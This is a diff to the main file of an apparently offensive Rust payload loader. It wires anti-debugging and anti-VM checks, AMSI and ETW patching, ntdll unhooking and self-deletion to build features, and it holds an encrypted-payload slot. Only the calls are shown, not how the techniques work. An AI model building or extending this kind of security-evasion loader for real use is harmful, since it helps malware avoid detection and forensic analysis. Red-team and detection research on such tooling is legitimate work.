@@ -9,13 +9,10 @@ mod execution;
 mod benign;
 
 // Conditional modules
-#[cfg(feature = "UtilitySelfDeletion")]
-mod utilities;
-
 #[cfg(any(feature = "CheckAntiDebugProcessDebugFlags", feature = "CheckAntiDebugSystemDebugControl", feature = "CheckAntiDebugRemoteDebugger", feature = "CheckAntiDebugNtGlobalFlag", feature = "CheckAntiDebugProcessList", feature = "CheckAntiDebugHardwareBreakpoints", feature = "CheckAntiVMCPU", feature = "CheckAntiVMRAM", feature = "CheckAntiVMUSB", feature = "CheckAntiVMProcesses", feature = "CheckDomainJoined"))]
 mod checks;
 
-#[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple", feature = "EvasionNtdllUnhooking", feature = "EvasionAMSIHwbp"))]
+#[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple", feature = "EvasionNtdllUnhooking", feature = "EvasionAMSIHwbp", feature = "EvasionSelfDeletion"))]
 mod evasion;
 
 // AES encryption support
@@ -36,7 +33,7 @@ const ENCPAYLOAD: &[u8] = &[];
 fn run_evasion_techniques() {
     #[cfg(feature = "EvasionNtdllUnhooking")]
     {
-        let _ = evasion::amsi::unhook_ntdll();
+        let _ = evasion::misc::unhook_ntdll();
     }
 
     #[cfg(feature = "EvasionAMSISimplePatch")]
@@ -53,21 +50,22 @@ fn run_evasion_techniques() {
     {
         let _ = evasion::etw::patch_etw();
     }
+    #[cfg(feature = "EvasionSelfDeletion")]
+    {
+        let _ = evasion::misc::delete_self_from_disk();
+    }
+
 }
 
 fn main() {
-    // Anti-debug checks - runs all enabled checks
+    // =======================================================================
+    // Anti-debug checks
+    // =======================================================================
     #[cfg(any(feature = "CheckAntiDebugProcessDebugFlags", feature = "CheckAntiDebugSystemDebugControl", feature = "CheckAntiDebugRemoteDebugger", feature = "CheckAntiDebugNtGlobalFlag", feature = "CheckAntiDebugProcessList", feature = "CheckAntiDebugHardwareBreakpoints", feature = "CheckAntiVMCPU", feature = "CheckAntiVMRAM", feature = "CheckAntiVMUSB", feature = "CheckAntiVMProcesses", feature = "CheckDomainJoined"))]
     {
         if checks::wrapper::run_all_checks() {
             std::process::exit(1);
         }
-    }
-
-    // Self-deletion utility
-    #[cfg(feature = "UtilitySelfDeletion")]
-    {
-        let _ = utilities::utils::delete_self_from_disk();
     }
 
     // =======================================================================
